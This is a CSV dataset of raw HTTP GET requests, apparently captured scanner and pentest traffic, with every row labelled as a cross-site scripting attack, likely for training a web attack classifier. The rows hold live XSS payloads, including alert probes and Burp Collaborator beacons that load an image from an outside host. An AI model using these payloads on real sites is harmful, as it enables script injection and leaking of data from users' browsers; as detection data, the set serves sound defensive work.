id,method,user_agent,url,refer,body,lable
199,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/assets/public/images/JuiceShop_Logo.png?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fmj94x67kbth4qr3drhxq5tchm8s1gx4pvdp0fo4X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/,"GET /assets/public/images/JuiceShop_Logo.png?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fmj94x67kbth4qr3drhxq5tchm8s1gx4pvdp0fo4X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv Connection: close  ",5
508,GET,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",/src/search.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&what=x&where=BODY&submit=Search,,"GET /src/search.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&what=x&where=BODY&submit=Search HTTP/1.1 Host: 116.211.155.193:7776 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ",5
2782,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/?page_id=0&&errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
89,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/grby50fejnpyylb7zb5kdnkbu20xoojcb3z0mqafX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/announcement_encrypted.md,http://121.4.111.58:3000/ftp,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/grby50fejnpyylb7zb5kdnkbu20xoojcb3z0mqafX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/announcement_encrypted.md HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
3021,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000831),/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>,,"<!--#include virtual=""/index.jsp""-->",5
3513,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extmail/cgi/c0zrmfzc.jspa?<script>cross_site_scripting.nasl</script>,,,5
3641,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/changepwd.cgi?__mode=step2&__mode=505'%20onMouseOver='alert(505);&username=990454,,,5
4201,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E,,,5
185,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/8clqqs064faqjdwzk3qcyf53fulo9f13tuhr4hs6X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/eastere.gg,http://121.4.111.58:3000/ftp/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/8clqqs064faqjdwzk3qcyf53fulo9f13tuhr4hs6X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/eastere.gg HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
3456,GET,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",/pan/wp-content/plugins/whizz/plugins/delete-plugin.php?plugin=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
2207,GET,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",/pan/webadmin/policy/group_table_ajax.php/</script><script>alert(document.domain)</script>,,,5
46,GET,python-requests/2.18.4,/index.php?c=waterfall&gaia_app=1&mso_searcher=srv62.safe.bjdt.qihoo.net&mso_searcher_port=6471&q=h%e7%8e%84%e5%b9%bb+&src=gaia_app_result_input&srcg=gaia_app&userid=3de30b27e1f577b8d5260036731616f9&a=index&c=waterfall&category=internal&channel=shouzhu&gaia_app=1&mso_searcher=srv62.safe.bjdt.qihoo.net&mso_searcher_port=6471&q=h%e7%8e%84%e5%b9%bb+&src=gaia_app_result_input&srcg=gaia_app&userid=3de30b27e1f577b8d5260036731616f9&version=2.0.2.1002&ls=shouzhu&channel=shouzhu&ls=shouzhu?&category=internal&version=2.0.2.1002%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
4176,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E,,,5
4256,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=11111111%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
457,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/quarantine/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/5jppzjebtr3zdfki4dfecs8er5xylp9h05rxen2cX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/quarantine/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/5jppzjebtr3zdfki4dfecs8er5xylp9h05rxen2cX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
307,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/order_b2d2-0f23596e6e9093f1.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fkg4ufwxwnlj0tiq23zs1zejo7fd81dp5gtag04pX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp,"GET /ftp/order_b2d2-0f23596e6e9093f1.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fkg4ufwxwnlj0tiq23zs1zejo7fd81dp5gtag04pX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
157,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/order_53f7-f6cf2025873219f0.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fmj94x67kbth4qr3drhxq5tchm8s2gz4rvfp2fq4X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp/,"GET /ftp/order_53f7-f6cf2025873219f0.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fmj94x67kbth4qr3drhxq5tchm8s2gz4rvfp2fq4X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
42,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/pa39q35vkbuj4zb2vx6y3czyipojce06ruohe53X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/,,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/pa39q35vkbuj4zb2vx6y3czyipojce06ruohe53X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/ HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0  ",5
388,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/encrypt.pyc?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fi5o0j2tgxp30cnp9ddjmrpyd84ey2pvdn4byyomdX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp/,"GET /ftp/encrypt.pyc?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fi5o0j2tgxp30cnp9ddjmrpyd84ey2pvdn4byyomdX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
2718,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/hoteldruid/visualizza_tabelle.php?anno=2019&id_sessione=&tipo_tabella=prenotazioni&subtotale_selezionate=1&num_cambia_pren=1&cerca_id_passati=1&cambia1=3134671%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
1118,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/index.html?urlmaskfilter=<script>foo</script>,,,5
218,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/usqc6egsk1qczzcl0p6ye1lpvg1bp2lqdh18tvjj8X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/usqc6egsk1qczzcl0p6ye1lpvg1bp2lqdh18tvjj8X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/  ",5
1,GET,python-requests/2.18.4,/index.php?c=waterfall&gaia_app=1&ls=ucpp&q=%e6%89%8b%e6%9c%ba%e5%8d%95%e6%9c%ba%e6%b8%b8%e6%88%8f+&srcg=gaia_app&userid=4063f84f93d56dbf78857c1cc2a5b3e5&channel=ucpp?&a=index&c=waterfall&category=internal&gaia_app=1&ls=ucpp&q=%e6%89%8b%e6%9c%ba%e5%8d%95%e6%9c%ba%e6%b8%b8%e6%88%8f+&srcg=gaia_app&userid=4063f84f93d56dbf78857c1cc2a5b3e5&version=2.0.2.1002&channel=ucpp&src=gaia_app_result_sug&category=internal&version=2.0.2.1002&src=gaia_app_result_sug%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
4938,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/url?hl=zh-CN&pref=hkredirect&pval=%3C%2FBoDY%3E%3CiMG+id%3D%27midYKTjR%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDy%3E&q=%3C%2FBOdY%3E%3CImg+id%3D%27InhtqdqU%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBODy%3E&sa=p&usg=AOvVaw2wHROB39vD6Gh883_F-BVX&ust=bXuKY%3CbXuKY%3EbXuKY%27bXuKY%22bXuKY%2FbXuKY-bXuKY,,,5
759,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/hbdt'""()&%25<acx><ScRiPt%20>vlD8(9329)<%2fScRiPt>/cyg/zhrmghg/index_34.shtml",http://114.251.10.253/,"GET /hbdt'""()&%25<acx><ScRiPt%20>vlD8(9329)<%2fScRiPt>/cyg/zhrmghg/index_34.shtml HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
3452,GET,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36,/pan/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
707,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/yj/yj/zz/2016/zz/2020'""()&%25<acx><ScRiPt%20>2KhR(9073)<%2fScRiPt>/496006.shtml",http://114.251.10.253/,"GET /yj/yj/zz/2016/zz/2020'""()&%25<acx><ScRiPt%20>2KhR(9073)<%2fScRiPt>/496006.shtml HTTP/1.1 Referer: http://114.251.10.253/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
1486,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/manager/loginController.htm?strinput=%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28205%29%3E&strinput=,,,5
1512,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000729),/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>,,"<!--#include virtual=""/index.jsp""-->",5
1520,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/cgi-bin/<script>cross_site_scripting.nasl</script>.nsf,,,5
736,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/hyhd/lshd/index'""()&%25<acx><ScRiPt%20>4Mrb(9566)<%2fScRiPt>_2.shtml",http://114.251.10.253/,"GET /hyhd/lshd/index'""()&%25<acx><ScRiPt%20>4Mrb(9566)<%2fScRiPt>_2.shtml HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
298,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/0xyawcec410gay7ikf9hgu04ovuoifb33urrei27X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_linux_arm_64.url,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/0xyawcec410gay7ikf9hgu04ovuoifb33urrei27X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_linux_arm_64.url HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
701,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/docs/appdev/;<img/src="">""%20onerror=alert(9233)>",http://114.251.10.47/,"GET /OrderProcessorEJB HTTP/1.1 Range: bytes=0-99999 Cookie: JSESSIONID=D9F9868E2707115B890F8DE2C36EB2E6 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.47 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
2722,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/movies/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&,,,5
1365,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003356),/pls/help/<script>alert('Vulnerable')</script>,,dump_sql=foo,5
1775,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),"/scripts/login.php?req=""><script>alert('testlink_login_req_param_xss.nasl-1657265214')</script>",,,5
73,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/ksgurw9wzlv05i22fz41bevojfp9d01ssgj86yunX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/ksgurw9wzlv05i22fz41bevojfp9d01ssgj86yunX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0  ",5
3801,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/w53apgzs.php3?<script>cross_site_scripting.nasl</script>,,,5
277,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/coupons_2013.md.bak?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2firdsqu8uyjuy4g10ex3zacumido6cx2luci65wtlX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp,"GET /ftp/coupons_2013.md.bak?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2firdsqu8uyjuy4g10ex3zacumido6cx2luci65wtlX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
33,GET,python-requests/2.18.4,/phpMyAdmin-4.6.3-all-languages/index.php?target=sql.php&token=24e3a2f123d185b2310159d38c748efa&db=elearning&table=department%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
1822,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/<img%20src=x%20onerror=alert(1)>/,,,5
